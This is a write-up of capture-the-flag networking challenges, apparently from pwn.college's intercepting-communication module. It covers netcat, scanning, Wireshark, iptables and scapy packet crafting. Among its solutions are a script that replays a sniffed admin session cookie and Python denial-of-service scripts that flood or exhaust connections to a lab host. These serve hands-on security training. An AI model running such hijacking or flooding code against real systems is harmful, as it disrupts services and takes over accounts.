# Connect

> From your host at 10.0.0.1, connect to the remote host at 10.0.0.2 on port 31337.

`/challenge/run`, `nc 10.0.0.2 31337`

# Send

> From your host at 10.0.0.1, connect to the remote host at 10.0.0.2 on port 31337, and send the message: Hello, World!.

`printf "Hello, World!\n" | nc 10.0.0.2 31337`

# Shutdown

> From your host at 10.0.0.1, connect to the remote host at 10.0.0.2 on port 31337, and then shutdown the connection.

`nc 10.0.0.2 31337 -N`, then press `Ctrl+D`.

# Listen

`nc $ip $port -lN`

# Scan 1

> From your host at 10.0.0.1, connect to some unknown remote host on the 10.0.0.0/24 subnet, on port 31337.

There's `There's unknown_ip = f"10.0.0.{random.randint(10, 254)}"` in the `/challenge/run`.

```bash scan1.bash
i=0
for i in $(seq 10 214); do
    timeout 0.2 ping -c 1 10.0.0.$i  # we know the server is at the same 
    if [ $? -eq 0 ]; then break; fi  # machine, so the timeout can be small.
done
nc 10.0.0.$i 31337 -N
```

# Scan 2

> From your host at 10.0.0.1, connect to some unknown remote host on the 10.0.0.0/16 subnet, on port 31337.

`nmap -vv -n 10.0.0.0/16 -sn --min-parallelism 200 > res.log`, `grep -B 1 "Host is up" res.log`

# Monitor 1

It seems I can't open wireshark at workspace. So I use Desktop.
After run `/challenge/run`, input `wireshark` to open GUI.
Choose eth0 to capture. Flag is at the reply packet of `10.0.0.1` with sign of `PSH, ACK`.
See the detial of the packet to find it.

# Monitor 2

The flag is split to multiple packages, and each package only has one letter.

Find a `FIN` signal to get the first letter of the flag.

# Sniffing Cookies

Read the code of `/challenge/run`.

The code `app.secret_key = os.urandom(8)` will let the session saving info in secret code in Cookie.

But the below code in `/challenge/run` exposed the cookie:

```py
assert s.post("http://10.0.0.2/login", data={"username":"admin", "password":admin_pw}).status_code == 200
    while True:
        try:
            s.get("http://10.0.0.2/ping")
```

The `assert` statement will keep the cookie in session so we can use wireshark to get the cookie in the `GET` method.

Use the cookie to get the flag.

```py
'''
GET /ping HTTP/1.1
Host: 10.0.0.2
User-Agent: python-requests/2.32.3
Accept-Encoding: gzip, deflate, zstd
Accept: */*
Connection: keep-alive
Cookie: session=eyJ1c2VyIjoiYWRtaW4ifQ.Z8fxdg.SqnIG1SqCcck6rid4_i9Fk75JTw
'''

import requests as req

url='http://10.0.0.2/flag'
head = dict(
    Cookie='session=eyJ1c2VyIjoiYWRtaW4ifQ.Z8fxdg.SqnIG1SqCcck6rid4_i9Fk75JTw',
)

sess = req.Session()
res = sess.get(url, headers=head)
print(res.text)
```

# Network Configuration

It takes me some time to search online.

```
root@ip-10-0-0-1:~/intercepting_communication# ip addr show eth0
3: eth0@if4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether da:e2:a3:1b:f2:c7 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.0.0.1/24 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::d8e2:a3ff:fe1b:f2c7/64 scope link proto kernel_ll
       valid_lft forever preferred_lft forever
root@ip-10-0-0-1:~/intercepting_communication# ip addr add 10.0.0.3 dev eth0
root@ip-10-0-0-1:~/intercepting_communication# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host proto kernel_lo
       valid_lft forever preferred_lft forever
3: eth0@if4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether da:e2:a3:1b:f2:c7 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.0.0.1/24 scope global eth0
       valid_lft forever preferred_lft forever
    inet 10.0.0.3/24 scope global secondary eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::d8e2:a3ff:fe1b:f2c7/64 scope link proto kernel_ll
       valid_lft forever preferred_lft forever
root@ip-10-0-0-1:~/intercepting_communication# nc 10.0.0.3 31337 -lN
pwn.college{flag-here}
```

# Firewall 1

> Your host at 10.0.0.1 is receiving traffic on port 31337; block that traffic.

`iptables -P INPUT DROP`

# Firewall 2

> Your host at 10.0.0.1 is receiving traffic on port 31337; block that traffic, but only from the remote host at 10.0.0.3, you must allow traffic from the remote host at 10.0.0.2.

`iptables -A INPUT -s 10.0.0.3 -j DROP`

# Firewall 3

> From your host at 10.0.0.1, connect to the remote host at 10.0.0.2 on port 31337. This time, you are currently blocking outbound traffic to port 31337.

```sh
root@ip-10-0-0-1:~/intercepting_communication# iptables -L
Chain INPUT (policy ACCEPT)
target     prot opt source               destination

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination
DROP       tcp  --  anywhere             anywhere             tcp dpt:31337
root@ip-10-0-0-1:~/intercepting_communication# iptables -D OUTPUT 1
root@ip-10-0-0-1:~/intercepting_communication# iptables -L
Chain INPUT (policy ACCEPT)
target     prot opt source               destination

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination
root@ip-10-0-0-1:~/intercepting_communication# nc 10.0.0.2 31337 -N
pwn.college{flag_here}
```

# Denial of Service 1,2

We can't use `ping`. But it's not difficult to write python script to do DoS attack.

```py
import concurrent.futures
import socket

def attack(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, 31337))
    s.send(("GET / HTTP/1.1\r\n").encode())
    s.send(("Host: " + ip + "\r\n\r\n").encode())
    s.close()

def worker(index):
    attack("10.0.0.2", 31337)

with concurrent.futures.ProcessPoolExecutor(max_workers=100) as executor:
    futures = [executor.submit(worker, i) for i in range(2049)]

concurrent.futures.wait(futures)
```

# Denial of Service 3

At least I waited for 3 min for this challenge.

```py
import concurrent.futures
import socket

def attack(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, 31337))
    return s

def worker(index):
    while True:
        ss.append(attack("10.0.0.2", 31337))

global ss
ss = []

with concurrent.futures.ProcessPoolExecutor(max_workers=500) as executor:
    futures = [executor.submit(worker, i) for i in range(2049)]

concurrent.futures.wait(futures)
```

# Ethernet

Run `/challenge/run` first.

```py
from scapy.all import *
# the source mac addr and iface is got by `ip link`
eth = Ether(dst="ff:ff:ff:ff:ff:ff", src="b6:6f:c4:08:35:9d", type=0xffff)
pkt = eth / "Hello, Ethernet!"
sendp(pkt, iface="eth0")
```

# IP

Run `/challenge/run` first.

```py
from scapy.all import *
send(IP(dst='10.0.0.2', proto=0xff))
```

# TCP

Run `/challenge/run` first.

```py
from scapy.all import *
pkt = IP(dst='10.0.0.2')/TCP(sport=31337, dport=31337, seq=31337, ack=31337, flags='APRSF')
send(pkt)
```

# TCP Handshake

```py
"""
https://scapy.readthedocs.io/en/latest/advanced_usage.html#real-example
"""

from scapy.all import *
from scapy.automaton import Automaton, ATMT

class TCP_handshake(Automaton):
    def parse_args(self, dst, sport, dport, seq, **kargs):
        Automaton.parse_args(self, **kargs)
        self.dst = dst
        # self.src =
        self.sport = sport
        self.dport = dport
        self.seq = seq
    
    @ATMT.state(initial=1)
    def begin(self):
        pass
    
    @ATMT.condition(begin)
    def send_synack(self):
        pkt = IP(dst=self.dst)/TCP(sport=self.sport, dport=self.dport, seq=self.seq, flags="S")
        send(pkt)
        raise self.wait_synack()

    @ATMT.state()
    def wait_synack(self):
        sniff(
              count=1,
              prn=self.handle_synack,
              filter=f'tcp port {self.sport} and src host {self.dst}', # it's BPF
              iface='eth0',
            #   timeout=
             )
        raise self.end()

    def handle_synack(self, packet):
        print(packet)
        pkt_ack = IP(dst=self.dst)/ \
                TCP(sport=self.sport,
                    dport=self.dport,
                    seq=packet["TCP"].ack,
                    ack=packet["TCP"].seq + 1, # or plus payload size
                    flags="A")
        send(pkt_ack)

    @ATMT.state(final=1)
    def end(self):
        pass

tcp_client = TCP_handshake('10.0.0.2', 31337, 31337, 31337)
tcp_client.run()
tcp_client.stop()
```
